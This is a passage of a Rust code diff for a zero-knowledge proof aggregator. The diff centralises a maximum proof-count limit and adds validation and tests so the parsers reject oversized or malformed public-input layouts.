 /// Supports two outputs (spend + change) from a single input.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PublicCircuitInputs {
     /// The asset ID (0 for native token).
     pub asset_id: u32,
     /// Amount to be received by the first exit account (spend).
     /// This value is quantized with 0.01 units of precision.
     ///
     /// **DEV NOTE**: The output amount unit on chain is still u128 with 12 decimals so we will need to
     /// scale by 10^10 when constructing the output amount during on-chain verification.
     pub output_amount_1: u32,
     /// Amount to be received by the second exit account (change).
     /// Set to 0 if only one output is needed.
     pub output_amount_2: u32,
     /// Volume fee rate in basis points (1 basis point = 0.01%).
     /// This is verified on-chain to match the runtime configuration.
     pub volume_fee_bps: u32,
     /// The nullifier (prevents double-spending).
     pub nullifier: BytesDigest,
     /// The address of the first exit account (spend destination).
     pub exit_account_1: BytesDigest,
     /// The address of the second exit account (change destination).
     /// Set to all zeros if only one output is needed.
     pub exit_account_2: BytesDigest,
     /// The hash of the block header.
     pub block_hash: BytesDigest,
     /// The block number, parsed from the block header.
     pub block_number: u32,
 }
 
 /// Exit account data in aggregated proofs.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PublicInputsByAccount {
     /// Output amounts of duplicate exit accounts summed.
     pub summed_output_amount: u32,
     /// The address of the account to pay out to.
     pub exit_account: BytesDigest,
 }
 
 /// Block data (block_hash, block_number) in aggregated proofs.
 #[derive(Debug, Default, Clone, PartialEq, Eq, Ord, PartialOrd)]
 pub struct BlockData {
     /// The hash of the block header.
     pub block_hash: BytesDigest,
     /// The block number, parsed from the block header.
     pub block_number: u32,
 }
 
 /// Aggregated public inputs from multiple wormhole proofs.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PrivateBatchPublicInputs {
     /// Number of unique exit-account groups reported by the wrapper circuit.
     /// This is informational only; semantic validation remains the circuit's responsibility.
     pub num_unique_exits: u32,
     /// The asset ID of the set (0 for native token).
     pub asset_id: u32,
     /// Volume fee rate in basis points (1 basis point = 0.01%).
     /// All aggregated proofs must have the same fee rate.
     pub volume_fee_bps: u32,
     /// The block data (block_hash, block_number) for all aggregated proofs.
     /// All proofs in the aggregation must reference the same block for their storage proofs.
     /// Note: The underlying transfers can occur in different blocks; this constraint only
     /// applies to the block used to generate the storage proof (i.e., when the proof is created).
     pub block_data: BlockData,
     /// The set of exit accounts and their summed output amounts.
     pub account_data: Vec<PublicInputsByAccount>,
     /// The nullifiers of each individual transfer proof.
     pub nullifiers: Vec<BytesDigest>,
 }
 
 /// Public inputs from a public-batch aggregation proof.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct PublicBatchPublicInputs {
     /// Aggregator address (4 felts, hash-derived account).
     pub aggregator_address: BytesDigest,
     /// The asset ID of the set (0 for native token).
     pub asset_id: u32,
     /// Volume fee rate in basis points.
     pub volume_fee_bps: u32,
     /// Block data shared by all non-dummy inner private batches.
     pub block_data: BlockData,
     /// Total exit slots across all inner proofs (structural constant).
     pub total_exit_slots: u32,
     /// Flattened exit slots from all inner private batches, in order.
     pub account_data: Vec<PublicInputsByAccount>,
     /// Flattened nullifiers from all inner private batches, in order.
     pub nullifiers: Vec<BytesDigest>,
 }
 
 /// Public-batch PI layout constants (mirrors `public_batch/circuit/constants.rs`).
 pub mod public_batch_pi {
     pub const AGGREGATOR_ADDRESS_LEN: usize = 4;
     pub const HEADER_LEN: usize = 12; // 4 + 1 + 1 + 4 + 1 + 1
     pub const EXIT_SLOT_LEN: usize = 5; // sum(1) + exit_account(4)
 
     #[inline]
     pub const fn exit_slots_per_inner(num_leaf_proofs: usize) -> usize {
         num_leaf_proofs * 2
     }
 
     #[inline]
     pub const fn nullifiers_per_inner(num_leaf_proofs: usize) -> usize {
         num_leaf_proofs
     }
 
     #[inline]
     pub const fn pi_len(num_private_batch_proofs: usize, num_leaf_proofs: usize) -> usize {
         HEADER_LEN
             + num_private_batch_proofs * exit_slots_per_inner(num_leaf_proofs) * EXIT_SLOT_LEN
             + num_private_batch_proofs * nullifiers_per_inner(num_leaf_proofs) * 4
     }
 }
 
 /// Helper to convert 4 u64 values (hash output) to a BytesDigest.
 /// Each felt contributes 8 bytes (its full u64 representation).
 /// Used for hash outputs which are native field elements.
 fn hash_u64s_to_bytes_digest(vals: &[u64]) -> anyhow::Result<BytesDigest> {
     if vals.len() != 4 {
         bail!(
             "Expected 4 field elements for hash digest, got {}",
             vals.len()
         );
     }
     let mut bytes = [0u8; DIGEST_BYTES_LEN];
     for (i, &val) in vals.iter().enumerate() {
         bytes[i * 8..(i + 1) * 8].copy_from_slice(&val.to_le_bytes());
     }
     BytesDigest::try_from(bytes).map_err(|e| anyhow::anyhow!("{}", e))
 }
 
 impl PublicCircuitInputs {
     /// Parse public inputs from a slice of u64 values (canonical representation of field elements).
     pub fn try_from_u64_slice(pis: &[u64]) -> anyhow::Result<Self> {
         if pis.len() != PUBLIC_INPUTS_FELTS_LEN {
             bail!(
                 "public inputs should contain {} field elements, got {}",
                 PUBLIC_INPUTS_FELTS_LEN,
                 pis.len()
             );
         }
 
         let asset_id: u32 = pis[ASSET_ID_INDEX]
             .try_into()
             .context("failed to convert asset_id to u32")?;
         let output_amount_1: u32 = pis[OUTPUT_AMOUNT_1_INDEX]
             .try_into()
             .context("failed to convert output_amount_1 to u32")?;
         let output_amount_2: u32 = pis[OUTPUT_AMOUNT_2_INDEX]
             .try_into()
             .context("failed to convert output_amount_2 to u32")?;
         let volume_fee_bps: u32 = pis[VOLUME_FEE_BPS_INDEX]
             .try_into()
             .context("failed to convert volume_fee_bps to u32")?;
 
         let nullifier = hash_u64s_to_bytes_digest(&pis[NULLIFIER_START_INDEX..NULLIFIER_END_INDEX])
             .context("failed to parse nullifier")?;
         let exit_account_1 =
             hash_u64s_to_bytes_digest(&pis[EXIT_ACCOUNT_1_START_INDEX..EXIT_ACCOUNT_1_END_INDEX])
                 .context("failed to parse exit_account_1")?;
         let exit_account_2 =
             hash_u64s_to_bytes_digest(&pis[EXIT_ACCOUNT_2_START_INDEX..EXIT_ACCOUNT_2_END_INDEX])
                 .context("failed to parse exit_account_2")?;
         let block_hash =
             hash_u64s_to_bytes_digest(&pis[BLOCK_HASH_START_INDEX..BLOCK_HASH_END_INDEX])
                 .context("failed to parse block_hash")?;
 
         let block_number: u32 = pis[BLOCK_NUMBER_INDEX]
             .try_into()
             .context("failed to convert block_number to u32")?;
 
         Ok(PublicCircuitInputs {
             asset_id,
             output_amount_1,
             output_amount_2,
             volume_fee_bps,
             nullifier,
             exit_account_1,
             exit_account_2,
             block_hash,
             block_number,
         })
     }
 }
 
 impl PrivateBatchPublicInputs {
     /// Parse aggregated public inputs from a slice of u64 values.
     pub fn try_from_u64_slice(pis: &[u64]) -> anyhow::Result<Self> {
         // Layout in the FINAL (deduped) wrapper proof PIs:
         // [num_unique_exits, asset_id, volume_fee_bps, block_data(5),
         //  [output_sum(1), exit_account(4)] * 2*N,  <-- 2 outputs per leaf
         //  nullifiers(4) * N, padding...]
         //
         // IMPORTANT: With 2 outputs per leaf, we have 2*N exit slots.
         // The parser validates shape/layout only. Circuit-level semantic constraints such as
         // same-block and same-asset consistency remain enforced by the proving circuit.
 
         if pis.len() < 8 {
             bail!(
                 "AggregatedPI: too few elements, need at least 8 for header, got {}",
                 pis.len()
             );
         }
 
         let payload_len = pis.len() - 8;
         if !payload_len.is_multiple_of(PUBLIC_INPUTS_FELTS_LEN) {
             bail!(
                 "AggregatedPI: malformed length {} - expected 8 + N*{} felts for the padded aggregated layout",
                 pis.len(),
                 PUBLIC_INPUTS_FELTS_LEN
             );
         }
 
         let num_unique_exits: u32 = pis[0]
             .try_into()
             .context("AggregatedPI: num_unique_exits at index 0 exceeds u32 range")?;
 
         let asset_id: u32 = pis[1]
             .try_into()
             .context("AggregatedPI: asset_id at index 1 exceeds u32 range")?;
         let volume_fee_bps: u32 = pis[2]
             .try_into()
             .context("AggregatedPI: volume_fee_bps at index 2 exceeds u32 range")?;
 
         // Number of leaf proofs (N) is derived from the padded total PI length.
         let n_leaf = payload_len / PUBLIC_INPUTS_FELTS_LEN;
 
         if n_leaf == 0 {
             bail!(
                 "AggregatedPI: n_leaf is 0 (pis.len()={}, PUBLIC_INPUTS_FELTS_LEN={})",
                 pis.len(),
                 PUBLIC_INPUTS_FELTS_LEN
             );
         }
+        ensure_proof_count(n_leaf, "n_leaf")?;
 
         let block_hash = hash_u64s_to_bytes_digest(&pis[3..7])
             .context("AggregatedPI: parsing block_hash from indices 3..7")?;
         let block_number: u32 = pis[7]
             .try_into()
             .context("AggregatedPI: parsing block_number from index 7")?;
 
         let block_data = BlockData {
             block_hash,
             block_number,
         };
 
         let mut cursor = 8usize;
 
         // Read 2*N exit account slots (two outputs per leaf proof)
         let num_exit_slots = n_leaf * 2;
         let mut account_data = Vec::with_capacity(num_exit_slots);
         for i in 0..num_exit_slots {
             if cursor >= pis.len() {
                 bail!(
                     "AggregatedPI: cursor {} out of bounds (pis.len={}) while reading account {}",
                     cursor,
                     pis.len(),
                     i
                 );
             }
             let summed_output_amount: u32 = pis[cursor].try_into().with_context(|| {
                 format!(
                     "AggregatedPI: summed_output_amount at cursor {} exceeds u32 range",
                     cursor
                 )
             })?;
             cursor += 1;
 
             if cursor + 4 > pis.len() {
                 bail!(
                     "AggregatedPI: not enough elements for exit_account {} (need cursor+4={}, have {})",
                     i,
                     cursor + 4,
                     pis.len()
                 );
             }
             let exit_account =
                 hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4]).with_context(|| {
                     format!(
                         "AggregatedPI: parsing exit_account[{}] at cursor {}",
                         i, cursor
                     )
                 })?;
             cursor += 4;
 
             account_data.push(PublicInputsByAccount {
                 summed_output_amount,
                 exit_account,
             });
         }
 
         // Read N nullifiers (one per leaf proof)
         let mut nullifiers = Vec::with_capacity(n_leaf);
         for i in 0..n_leaf {
             if cursor + 4 > pis.len() {
                 bail!(
                     "AggregatedPI: not enough elements for nullifier {} (need cursor+4={}, have {})",
                     i,
                     cursor + 4,
                     pis.len()
                 );
             }
             let n = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4]).with_context(|| {
                 format!(
                     "AggregatedPI: parsing nullifier[{}] at cursor {}",
                     i, cursor
                 )
             })?;
             cursor += 4;
 
             nullifiers.push(n);
         }
 
         // Verify we consumed expected number of felts
         // 8 metadata + 2*N*5 exit slots (1 sum + 4 account) + N*4 nullifiers
         let expected_felts = 8 + num_exit_slots * 5 + n_leaf * 4;
         if cursor != expected_felts {
             bail!(
                 "AggregatedPI: cursor mismatch - consumed {} felts, expected {} (n_leaf={}, num_exit_slots={})",
                 cursor,
                 expected_felts,
                 n_leaf,
                 num_exit_slots
             );
         }
 
         Ok(PrivateBatchPublicInputs {
             num_unique_exits,
             asset_id,
             volume_fee_bps,
             block_data,
             account_data,
             nullifiers,
         })
     }
 }
 
 impl PublicBatchPublicInputs {
     /// Parse public-batch public inputs from a slice of u64 values.
     ///
     /// `num_private_batch_proofs` and `num_leaf_proofs` must match the circuit
     /// parameters used to generate the proof (embedded in the on-chain verifier).
     pub fn try_from_u64_slice(
         pis: &[u64],
         num_private_batch_proofs: usize,
         num_leaf_proofs: usize,
     ) -> anyhow::Result<Self> {
         use public_batch_pi::{
             exit_slots_per_inner, nullifiers_per_inner, pi_len, AGGREGATOR_ADDRESS_LEN, HEADER_LEN,
         };
 
-        if num_private_batch_proofs == 0 || num_leaf_proofs == 0 {
-            bail!("PublicBatchPI: num_private_batch_proofs and num_leaf_proofs must be > 0");
-        }
+        let (num_private_batch_proofs, num_leaf_proofs) =
+            ensure_public_batch_dimensions(num_private_batch_proofs, num_leaf_proofs)?;
 
         let expected_len = pi_len(num_private_batch_proofs, num_leaf_proofs);
         if pis.len() != expected_len {
             bail!(
                 "PublicBatchPI: expected {} felts (n_inner={}, n_leaves={}), got {}",
                 expected_len,
                 num_private_batch_proofs,
                 num_leaf_proofs,
                 pis.len()
             );
         }
 
         let slots_per_inner = exit_slots_per_inner(num_leaf_proofs);
         let nulls_per_inner = nullifiers_per_inner(num_leaf_proofs);
         let total_exit_slots_expected = (num_private_batch_proofs * slots_per_inner) as u32;
 
         let aggregator_address = hash_u64s_to_bytes_digest(&pis[0..AGGREGATOR_ADDRESS_LEN])
             .context("PublicBatchPI: parsing aggregator_address")?;
 
         let asset_id: u32 = pis[4]
             .try_into()
             .context("PublicBatchPI: asset_id exceeds u32 range")?;
         let volume_fee_bps: u32 = pis[5]
             .try_into()
             .context("PublicBatchPI: volume_fee_bps exceeds u32 range")?;
 
         let block_hash =
             hash_u64s_to_bytes_digest(&pis[6..10]).context("PublicBatchPI: parsing block_hash")?;
         let block_number: u32 = pis[10]
             .try_into()
             .context("PublicBatchPI: block_number exceeds u32 range")?;
 
         let total_exit_slots: u32 = pis[11]
             .try_into()
             .context("PublicBatchPI: total_exit_slots exceeds u32 range")?;
         if total_exit_slots != total_exit_slots_expected {
             bail!(
                 "PublicBatchPI: total_exit_slots {} != expected {}",
                 total_exit_slots,
                 total_exit_slots_expected
             );
         }
 
         let block_data = BlockData {
             block_hash,
             block_number,
         };
 
         let mut cursor = HEADER_LEN;
         let total_slots = num_private_batch_proofs * slots_per_inner;
         let mut account_data = Vec::with_capacity(total_slots);
         for i in 0..total_slots {
             let summed_output_amount: u32 = pis[cursor]
                 .try_into()
                 .with_context(|| format!("PublicBatchPI: exit slot {} sum exceeds u32", i))?;
             cursor += 1;
 
             let exit_account = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                 .with_context(|| format!("PublicBatchPI: parsing exit slot {} account", i))?;
             cursor += 4;
 
             account_data.push(PublicInputsByAccount {
                 summed_output_amount,
                 exit_account,
             });
         }
 
         let total_nullifiers = num_private_batch_proofs * nulls_per_inner;
         let mut nullifiers = Vec::with_capacity(total_nullifiers);
         for i in 0..total_nullifiers {
             let n = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                 .with_context(|| format!("PublicBatchPI: parsing nullifier {}", i))?;
             cursor += 4;
             nullifiers.push(n);
         }
 
         debug_assert_eq!(cursor, expected_len);
 
         Ok(PublicBatchPublicInputs {
             aggregator_address,
             asset_id,
             volume_fee_bps,
             block_data,
             total_exit_slots,
             account_data,
             nullifiers,
         })
     }
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{PrivateBatchPublicInputs, PUBLIC_INPUTS_FELTS_LEN};
+    use super::{public_batch_pi, PrivateBatchPublicInputs, PublicBatchPublicInputs, PUBLIC_INPUTS_FELTS_LEN, MAX_PROOF_COUNT};
 
     #[test]
     fn aggregated_public_inputs_reject_malformed_padded_length() {
         let err = PrivateBatchPublicInputs::try_from_u64_slice(&[0u64; 9]).unwrap_err();
         assert!(err.to_string().contains(&format!(
             "malformed length 9 - expected 8 + N*{} felts",
             PUBLIC_INPUTS_FELTS_LEN
         )));
     }
 
     #[test]
+    fn aggregated_public_inputs_reject_oversized_leaf_count() {
+        let pis = vec![0u64; 8 + (MAX_PROOF_COUNT + 1) * PUBLIC_INPUTS_FELTS_LEN];
+        let err = PrivateBatchPublicInputs::try_from_u64_slice(&pis).unwrap_err();
+        assert!(err.to_string().contains("exceeds maximum"));
+    }
+
+    #[test]
+    fn public_batch_public_inputs_reject_oversized_dimensions() {
+        let pis = vec![0u64; public_batch_pi::pi_len(MAX_PROOF_COUNT + 1, 1)];
+        let err = PublicBatchPublicInputs::try_from_u64_slice(&pis, MAX_PROOF_COUNT + 1, 1)
+            .unwrap_err();
+        assert!(err.to_string().contains("exceeds maximum"));
+    }
+
+    #[test]
     fn aggregated_public_inputs_parse_num_unique_exits() {
         let mut pis = vec![0u64; 8 + PUBLIC_INPUTS_FELTS_LEN];
         pis[0] = 1; // num_unique_exits
         pis[7] = 42; // block_number
 
         let parsed = PrivateBatchPublicInputs::try_from_u64_slice(&pis).unwrap();
         assert_eq!(parsed.num_unique_exits, 1);
         assert_eq!(parsed.block_data.block_number, 42);
         assert_eq!(parsed.account_data.len(), 2);
         assert_eq!(parsed.nullifiers.len(), 1);
     }
 }

diff --git a/wormhole/aggregator/src/config.rs b/wormhole/aggregator/src/config.rs
--- a/wormhole/aggregator/src/config.rs
+++ b/wormhole/aggregator/src/config.rs
@@ -1,185 +1,176 @@
 use anyhow::{anyhow, bail, Result};
+pub use qp_wormhole_inputs::{ensure_proof_count, MAX_PROOF_COUNT};
 use serde::{Deserialize, Serialize};
 use std::fs::write;
 use std::path::Path;
 
-/// Maximum allowed proof count to prevent excessive memory/CPU consumption.
-/// This is a reasonable upper bound - aggregating more than 1024 proofs per layer
-/// would result in impractically large circuits.
-///
-/// In practice, even ~64 proofs is near the practical limit on commodity hardware
-/// (current benches test up to 49). The 1024 cap is "obviously safe" headroom.
-/// Any future need to raise this limit would require a coordinated artifact
-/// regeneration across all deployments.
-pub const MAX_PROOF_COUNT: usize = 1024;
-
 /// Configuration stored alongside circuit binaries (config.json).
 /// This struct is used by both circuit-builder (to save config) and
 /// aggregator (to load config when aggregating proofs).
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct CircuitBinsConfig {
     pub num_leaf_proofs: usize,
     /// Number of private-batch proofs per public batch (None = private batch only).
     /// Accepts the legacy `num_layer0_proofs` key when loading older config.json files.
     #[serde(alias = "num_layer0_proofs")]
     pub num_private_batch_proofs: Option<usize>,
 }
 
 impl CircuitBinsConfig {
     /// Create a new config with validation.
     ///
     /// # Errors
     /// Returns an error if:
     /// - `num_leaf_proofs` is 0 or exceeds `MAX_PROOF_COUNT`
     /// - `num_private_batch_proofs` is `Some(0)` or exceeds `MAX_PROOF_COUNT`
     pub fn new(num_leaf_proofs: usize, num_private_batch_proofs: Option<usize>) -> Result<Self> {
         let config = Self {
             num_leaf_proofs,
             num_private_batch_proofs,
         };
         config.validate()?;
         Ok(config)
     }
 
     /// Validate the config values.
     ///
     /// # Errors
     /// Returns an error if proof counts are zero or exceed reasonable bounds.
     pub fn validate(&self) -> Result<()> {
         if self.num_leaf_proofs == 0 {
             bail!("num_leaf_proofs must be > 0");
         }
         if self.num_leaf_proofs > MAX_PROOF_COUNT {
             bail!(
                 "num_leaf_proofs ({}) exceeds maximum allowed ({})",
                 self.num_leaf_proofs,
                 MAX_PROOF_COUNT
             );
         }
         if let Some(n) = self.num_private_batch_proofs {
             if n == 0 {
                 bail!("num_private_batch_proofs must be > 0 when specified");
             }
             if n > MAX_PROOF_COUNT {
                 bail!(
                     "num_private_batch_proofs ({}) exceeds maximum allowed ({})",
                     n,
                     MAX_PROOF_COUNT
                 );
             }
         }
         Ok(())
     }
 
     /// Load config from a directory containing circuit binaries.
     ///
     /// # Errors
     /// Returns an error if the file cannot be read, parsed, or contains invalid values.
     pub fn load<P: AsRef<Path>>(bins_dir: P) -> Result<Self> {
         let config_path = bins_dir.as_ref().join("config.json");
         let config_str = std::fs::read_to_string(&config_path)
             .map_err(|e| anyhow!("failed to read {}: {}", config_path.display(), e))?;
         let config: Self = serde_json::from_str(&config_str)
             .map_err(|e| anyhow!("failed to parse {}: {}", config_path.display(), e))?;
         config.validate()?;
         Ok(config)
     }
 
     /// Save config to a directory
     pub fn save<P: AsRef<Path>>(&self, bins_dir: P) -> Result<()> {
         let config_path = bins_dir.as_ref().join("config.json");
         let config_str = serde_json::to_string_pretty(self)
             .map_err(|e| anyhow!("failed to serialize config: {}", e))?;
         write(&config_path, config_str)
             .map_err(|e| anyhow!("failed to write {}: {}", config_path.display(), e))?;
         println!("Config saved to {}", config_path.display());
         Ok(())
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::{CircuitBinsConfig, MAX_PROOF_COUNT};
     use std::{
         fs,
         path::PathBuf,
         time::{SystemTime, UNIX_EPOCH},
     };
 
     fn temp_dir(name: &str) -> PathBuf {
         let suffix = SystemTime::now()
             .duration_since(UNIX_EPOCH)
             .unwrap()
             .as_nanos();
         let dir = std::env::temp_dir().join(format!("qp-wormhole-config-{name}-{suffix}"));
         fs::create_dir_all(&dir).unwrap();
         dir
     }
 
     #[test]
     fn config_round_trip() {
         let dir = temp_dir("round-trip");
 
         let config = CircuitBinsConfig::new(7, Some(4)).unwrap();
         config.save(&dir).unwrap();
 
         let loaded = CircuitBinsConfig::load(&dir).unwrap();
         assert_eq!(loaded.num_leaf_proofs, 7);
         assert_eq!(loaded.num_private_batch_proofs, Some(4));
 
         fs::remove_dir_all(dir).unwrap();
     }
 
     #[test]
     fn config_without_public_batch() {
         let dir = temp_dir("no-public_batch");
 
         let config = CircuitBinsConfig::new(8, None).unwrap();
         config.save(&dir).unwrap();
 
         let loaded = CircuitBinsConfig::load(&dir).unwrap();
         assert_eq!(loaded.num_leaf_proofs, 8);
         assert_eq!(loaded.num_private_batch_proofs, None);
 
         fs::remove_dir_all(dir).unwrap();
     }
 
     #[test]
     fn new_rejects_zero_num_leaf_proofs() {
         let err = CircuitBinsConfig::new(0, Some(4)).unwrap_err();
         assert!(err.to_string().contains("num_leaf_proofs must be > 0"));
     }
 
     #[test]
     fn new_rejects_zero_num_private_batch_proofs() {
         let err = CircuitBinsConfig::new(16, Some(0)).unwrap_err();
         assert!(err
             .to_string()
             .contains("num_private_batch_proofs must be > 0"));
     }
 
     #[test]
     fn new_rejects_excessive_num_leaf_proofs() {
         let err = CircuitBinsConfig::new(MAX_PROOF_COUNT + 1, None).unwrap_err();
         assert!(err.to_string().contains("exceeds maximum"));
     }
 
     #[test]
     fn new_rejects_excessive_num_private_batch_proofs() {
         let err = CircuitBinsConfig::new(16, Some(MAX_PROOF_COUNT + 1)).unwrap_err();
         assert!(err.to_string().contains("exceeds maximum"));
     }
 
     #[test]
     fn load_rejects_invalid_config() {
         let dir = temp_dir("invalid-config");
         // Write a config with zero num_leaf_proofs directly (bypassing new())
         let invalid_json = r#"{"num_leaf_proofs": 0, "num_private_batch_proofs": 4}"#;
         fs::write(dir.join("config.json"), invalid_json).unwrap();
 
         let err = CircuitBinsConfig::load(&dir).unwrap_err();
         assert!(err.to_string().contains("num_leaf_proofs must be > 0"));
 
         fs::remove_dir_all(dir).unwrap();
     }
 }

diff --git a/wormhole/aggregator/src/lib.rs b/wormhole/aggregator/src/lib.rs
--- a/wormhole/aggregator/src/lib.rs
+++ b/wormhole/aggregator/src/lib.rs
@@ -1,14 +1,14 @@
 pub mod aggregator;
 pub mod common;
 pub mod config;
 pub mod dummy_proof;
 pub mod private_batch;
 pub mod public_batch;
 
 #[cfg(feature = "profile")]
 pub mod profile;
 
-pub use config::{CircuitBinsConfig, MAX_PROOF_COUNT};
+pub use config::{ensure_proof_count, CircuitBinsConfig, MAX_PROOF_COUNT};
 pub use dummy_proof::{
     build_dummy_circuit_inputs, generate_dummy_proof, DUMMY_BLOCK_HASH, DUMMY_EXIT_ACCOUNT,
 };

diff --git a/wormhole/aggregator/src/common/utils.rs b/wormhole/aggregator/src/common/utils.rs
--- a/wormhole/aggregator/src/common/utils.rs
+++ b/wormhole/aggregator/src/common/utils.rs
@@ -1,98 +1,105 @@
 use anyhow::{anyhow, Result};
 use plonky2::{
     field::types::PrimeField64,
     plonk::circuit_data::{CommonCircuitData, VerifierCircuitData, VerifierOnlyCircuitData},
     plonk::proof::ProofWithPublicInputs,
     util::serialization::DefaultGateSerializer,
 };
+use qp_wormhole_inputs::ensure_proof_count;
 use zk_circuits_common::circuit::{C, D, F};
 
 use crate::private_batch::circuit::constants::{aggregated_output, ASSET_ID_START, LEAF_PI_LEN};
 
 /// Load verifier circuit data (common + verifier-only) from serialized bytes.
 pub fn load_verifier_data_from_bytes(
     common_bytes: &[u8],
     verifier_only_bytes: &[u8],
     label: &str,
 ) -> Result<VerifierCircuitData<F, C, D>> {
     let gate_serializer = DefaultGateSerializer;
 
     let common = CommonCircuitData::from_bytes(common_bytes.to_vec(), &gate_serializer)
         .map_err(|e| anyhow!("failed to deserialize {} common data: {}", label, e))?;
 
     let verifier_only =
         VerifierOnlyCircuitData::<C, D>::from_bytes(verifier_only_bytes.to_vec())
             .map_err(|e| anyhow!("failed to deserialize {} verifier-only data: {}", label, e))?;
 
     Ok(VerifierCircuitData {
         verifier_only,
         common,
     })
 }
 
 pub fn ensure_proof_public_input_len(
     proof: &ProofWithPublicInputs<F, C, D>,
     expected_len: usize,
     label: &str,
 ) -> Result<()> {
     let actual_len = proof.public_inputs.len();
     if actual_len != expected_len {
         return Err(anyhow!(
             "{} public input length mismatch: expected {}, got {}",
             label,
             expected_len,
             actual_len
         ));
     }
 
     Ok(())
 }
 
 pub fn leaf_proof_asset_id(proof: &ProofWithPublicInputs<F, C, D>) -> Result<u32> {
     ensure_proof_public_input_len(proof, LEAF_PI_LEN, "leaf proof")?;
     proof.public_inputs[ASSET_ID_START]
         .to_canonical_u64()
         .try_into()
         .map_err(|_| anyhow!("leaf proof asset_id exceeds u32 range"))
 }
 
 pub fn private_batch_num_leaves_from_padded_pi_len(pi_len: usize) -> Result<usize> {
     if pi_len < aggregated_output::HEADER_LEN {
         return Err(anyhow!(
             "private-batch aggregated public input length {} is smaller than the fixed header {}",
             pi_len,
             aggregated_output::HEADER_LEN
         ));
     }
 
     let payload_len = pi_len - aggregated_output::HEADER_LEN;
     if !payload_len.is_multiple_of(LEAF_PI_LEN) {
         return Err(anyhow!(
             "private-batch aggregated public input length {} is malformed: expected {} + N*{}",
             pi_len,
             aggregated_output::HEADER_LEN,
             LEAF_PI_LEN
         ));
     }
 
     let num_leaves = payload_len / LEAF_PI_LEN;
-    if num_leaves == 0 {
-        return Err(anyhow!(
-            "private-batch aggregated public input length {} encodes zero leaves",
-            pi_len
-        ));
-    }
+    ensure_proof_count(num_leaves, "private_batch_num_leaves")?;
 
     Ok(num_leaves)
 }
 
 #[cfg(test)]
 mod tests {
     use super::private_batch_num_leaves_from_padded_pi_len;
+    use crate::{
+        config::MAX_PROOF_COUNT,
+        private_batch::circuit::constants::{aggregated_output, LEAF_PI_LEN},
+    };
 
     #[test]
     fn private_batch_num_leaves_from_padded_pi_len_rejects_malformed_lengths() {
         let err = private_batch_num_leaves_from_padded_pi_len(9).unwrap_err();
         assert!(err.to_string().contains("malformed"));
     }
+
+    #[test]
+    fn private_batch_num_leaves_from_padded_pi_len_rejects_oversized_lengths() {
+        let oversized_len = aggregated_output::HEADER_LEN + (MAX_PROOF_COUNT + 1) * LEAF_PI_LEN;
+        let err = private_batch_num_leaves_from_padded_pi_len(oversized_len).unwrap_err();
+        assert!(err.to_string().contains("exceeds maximum"));
+    }
 }

diff --git a/wormhole/aggregator/src/private_batch/circuit/build.rs b/wormhole/aggregator/src/private_batch/circuit/build.rs
--- a/wormhole/aggregator/src/private_batch/circuit/build.rs
+++ b/wormhole/aggregator/src/private_batch/circuit/build.rs
@@ -1,186 +1,189 @@
 //! Prebuild / serialization helpers for the monolithic Private-batch aggregation circuit.
 //!
 //! Generates: `private_batch_common.bin`, `private_batch_verifier.bin`, `private_batch_prover.bin`
 //!
 //! Expects `common.bin` and `verifier.bin` to already exist in the output directory.
 
 use anyhow::{anyhow, Context, Result};
 use plonky2::{
     plonk::circuit_data::{CommonCircuitData, VerifierOnlyCircuitData},
     util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer},
 };
+use qp_wormhole_inputs::ensure_proof_count;
 use std::{
     fs::{create_dir_all, write},
     path::Path,
 };
 use zk_circuits_common::circuit::{wormhole_private_batch_circuit_config, C, D, F};
 
 use crate::private_batch::circuit::circuit_logic::PrivateBatchCircuit;
 
 /// Generate prebuilt Private-batch aggregation circuit binaries.
 pub fn generate_private_batch_circuit_binaries<P: AsRef<Path>>(
     output_dir: P,
     num_leaf_proofs: usize,
     include_prover: bool,
 ) -> Result<()> {
+    ensure_proof_count(num_leaf_proofs, "num_leaf_proofs")?;
+
     let output_path = output_dir.as_ref();
     create_dir_all(output_path)?;
 
     println!(
         "Building prebuilt private-batch aggregation circuit (num_leaf_proofs={})...",
         num_leaf_proofs
     );
 
     let leaf_common = load_leaf_common_data(&output_path.join("common.bin"))?;
     let leaf_verifier_only = load_leaf_verifier_only_data(&output_path.join("verifier.bin"))?;
 
     let agg_circuit = PrivateBatchCircuit::new(
         wormhole_private_batch_circuit_config(),
         &leaf_common,
         &leaf_verifier_only,
         num_leaf_proofs,
     );
 
     let agg_targets = agg_circuit.targets();
     let circuit_data = agg_circuit.build_circuit();
 
     let gate_serializer = DefaultGateSerializer;
     let generator_serializer = DefaultGeneratorSerializer::<C, D> {
         _phantom: Default::default(),
     };
 
     // Generate the dummy private-batch proof template (an all-dummy batch) used to pad
     // partial public batches. Must happen BEFORE consuming circuit_data below
     // (prove() borrows, prover_data() moves). Only possible/needed when proving
     // artifacts are requested (requires the leaf dummy proof from the same run).
     if include_prover {
         let dummy_batch_proof_bytes = generate_dummy_private_batch_proof(
             &circuit_data,
             &agg_targets,
             &leaf_common,
             output_path,
             num_leaf_proofs,
         )?;
         write(
             output_path.join("dummy_private_batch_proof.bin"),
             &dummy_batch_proof_bytes,
         )?;
         println!(
             "Saved {}/dummy_private_batch_proof.bin ({} bytes)",
             output_path.display(),
             dummy_batch_proof_bytes.len()
         );
     }
 
     let verifier_data = circuit_data.verifier_data();
     let prover_data = circuit_data.prover_data();
     let common_data = &verifier_data.common;
 
     let agg_common_bytes = common_data
         .to_bytes(&gate_serializer)
         .map_err(|e| anyhow!("Failed to serialize aggregated common data: {}", e))?;
     write(
         output_path.join("private_batch_common.bin"),
         agg_common_bytes,
     )?;
     println!("Saved {}/private_batch_common.bin", output_path.display());
 
     let agg_verifier_only_bytes = verifier_data
         .verifier_only
         .to_bytes()
         .map_err(|e| anyhow!("Failed to serialize aggregated verifier data: {}", e))?;
     write(
         output_path.join("private_batch_verifier.bin"),
         agg_verifier_only_bytes,
     )?;
     println!("Saved {}/private_batch_verifier.bin", output_path.display());
 
     if include_prover {
